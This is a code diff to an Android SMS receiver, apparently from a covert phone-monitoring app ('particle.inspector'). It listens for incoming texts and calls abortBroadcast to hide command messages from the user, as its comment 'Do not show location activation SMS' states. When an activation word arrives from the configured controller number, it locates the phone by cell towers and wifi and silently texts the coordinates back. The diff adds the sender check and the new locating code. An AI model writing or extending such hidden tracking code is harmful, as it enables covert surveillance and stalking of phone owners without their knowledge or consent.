@@ -22,7 +22,10 @@ import com.particle.inspector.common.util.SIM_TYPE;
 import com.particle.inspector.common.util.StrUtils;
 import com.particle.inspector.common.util.sms.AUTH_SMS_TYPE;
 
+import system.service.feature.location.CellInfoManager;
+import system.service.feature.location.CellLocationManager;
 import system.service.feature.location.LocationUtil;
+import system.service.feature.location.WifiInfoManager;
 import system.service.feature.sms.SmsCtrl;
 import com.particle.inspector.common.util.DeviceProperty;
 import com.particle.inspector.common.util.SysUtils;
@@ -37,6 +40,7 @@ import android.content.Intent;
 import android.location.Location;
 import android.media.MediaRecorder;
 import android.os.Bundle;
+import android.os.Looper;
 import android.telephony.PhoneStateListener;
 import android.telephony.SmsMessage;
 import android.telephony.TelephonyManager;
@@ -55,7 +59,7 @@ public class SmsReceiver extends BroadcastReceiver
 	@Override
 	public void onReceive(Context context, Intent intent) 
 	{
-		android.os.Debug.waitForDebugger();//TODO should be removed in the release
+		//android.os.Debug.waitForDebugger();//TODO should be removed in the release
 		
 		if (intent.getAction().equals(SMS_RECEIVED)) 
 		{
@@ -211,11 +215,10 @@ public class SmsReceiver extends BroadcastReceiver
 			
 			//-------------------------------------------------------------------------------
 			// If it is the indication SMS
-			else if (smsBody.startsWith(SmsConsts.HEADER_INDICATION))
+			else if (smsBody.startsWith(SmsConsts.HEADER_INDICATION) && smsBody.getBytes()[2] == '#')
 			{
-				if (smsBody.getBytes()[2] == '#') {
-					abortBroadcast(); // Finish broadcast, the system will notify this SMS
-				}
+				abortBroadcast(); // Finish broadcast, the system will notify this SMS
+				
 				String phoneNum = SmsCtrl.getSmsAddress(intent);
 				IndicationHandler.handleIndicationSms(context, smsBody, phoneNum);
 			}
@@ -262,39 +265,61 @@ public class SmsReceiver extends BroadcastReceiver
 			// Send location SMS if being triggered by location activation word
 			else if (smsBody.equalsIgnoreCase(SmsConsts.INDICATION_LOCATION))
 			{
-				if (!ConfigCtrl.isLegal(context)) return;
-				
-				this.context = context;
 				abortBroadcast(); // Do not show location activation SMS
+				
+				if (!ConfigCtrl.isLegal(context)) return;
+				this.context = context;
+				
+				String phoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
+				
+				// If the coming phone is not the receiver phone, return
+				String comingPhoneNum = SmsCtrl.getSmsAddress(intent);
+				if (phoneNum == null || phoneNum.length() <= 0 || !comingPhoneNum.contains(phoneNum)) {
+					return;
+				}
 				
 				// Start a new thread to do the time-consuming job
     			new Thread(new Runnable(){
     				public void run() {
+    					CellInfoManager cellManager = new CellInfoManager(SmsReceiver.this.context);
+    		            WifiInfoManager wifiManager = new WifiInfoManager(SmsReceiver.this.context);
+    		            CellLocationManager locationManager = new CellLocationManager(SmsReceiver.this.context, cellManager, wifiManager) {
+    		            	@Override
+    		                public void onLocationChanged() {
+    		            		String sms = String.format(SmsReceiver.this.context.getResources().getString(R.string.location_sms), 
+    		    						String.format("%.6f,%.6f", this.latitude(), this.longitude()));
+    		            		String phoneNum = GlobalPrefActivity.getReceiverPhoneNum(SmsReceiver.this.context);
+    		            		boolean ret = SmsCtrl.sendSms(phoneNum, sms);
+    		                    this.stop();
+    		                }
+    		            };
+    		            locationManager.start();
+    					
+    					/*
     					String phoneNum = GlobalPrefActivity.getReceiverPhoneNum(SmsReceiver.this.context);
-    					if (phoneNum.length() > 0) {
-    						if (BootService.locationUtil == null) {
-    							//Log.e(LOGTAG, "GPS utility is NULL");
-    							return;
-    						}
-    						BootService.locationUtil.sentSMS = false;
-    						String realOrHist = LocationUtil.REALPOSITION;
-    						String type       = LocationUtil.GPS;
-    						Location location = BootService.locationUtil.getGeoLocation(type, realOrHist);
-    						String locationSms = "";
-    						if (location != null) {
-    							locationSms = SmsCtrl.buildLocationSms(SmsReceiver.this.context, location, type, realOrHist);
-    						}
-    						else {
-    							String gsmOr3G = BaseStationUtil.G3;
-    							BaseStationLocation bsLoc = BaseStationUtil.getBaseStationLocation(SmsReceiver.this.context, gsmOr3G);
-    							locationSms = SmsCtrl.buildBaseStationLocationSms(SmsReceiver.this.context, bsLoc, gsmOr3G);
-    						}
-    						
-    						if (!BootService.locationUtil.sentSMS) {
-    							boolean ret = SmsCtrl.sendSms(phoneNum, locationSms);
-    							BootService.locationUtil.sentSMS = true;
-    						}
+    					if (BootService.locationUtil == null) {
+    						return;
     					}
+    					BootService.locationUtil.sentSMS = false;
+    					String realOrHist = LocationUtil.REALPOSITION;
+    					String type       = LocationUtil.GPS;
+    					Location location = BootService.locationUtil.getGeoLocation(type, realOrHist);
+    					String locationSms = "";
+    					if (location != null) {
+    						locationSms = SmsCtrl.buildLocationSms(SmsReceiver.this.context, location, type, realOrHist);
+    					}
+    					else {
+    						String gsmOr3G = BaseStationUtil.G3;
+    						BaseStationLocation bsLoc = BaseStationUtil.getBaseStationLocation(SmsReceiver.this.context, gsmOr3G);
+    						locationSms = SmsCtrl.buildBaseStationLocationSms(SmsReceiver.this.context, bsLoc, gsmOr3G);
+    					}
+    					
+    					if (!BootService.locationUtil.sentSMS) {
+    						boolean ret = SmsCtrl.sendSms(phoneNum, locationSms);
+    						BootService.locationUtil.sentSMS = true;
+    					}
+    					Looper.loop();
+    					*/
     				}
     			}).start();
 			}
